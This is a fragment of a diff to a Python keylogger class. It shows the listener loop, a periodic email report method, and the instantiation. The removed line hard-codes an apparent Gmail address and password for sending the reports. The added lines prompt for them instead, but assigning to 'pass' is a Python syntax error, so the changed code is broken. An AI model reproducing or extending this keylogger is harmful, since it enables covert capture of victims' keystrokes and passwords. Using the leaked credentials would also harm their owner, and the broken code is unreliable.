@@ -42,5 +42,6 @@ class Keylogger:
         with listen as listener:
             self.sendReport()
             listener.join()
-
-my_keylogger=Keylogger(60, "noahsiva123@gmail.com", "hfJv_tw6")
+mail=input("enter mail id ")
+pass=input("enter password")
+my_keylogger=Keylogger(60, mail, pass )
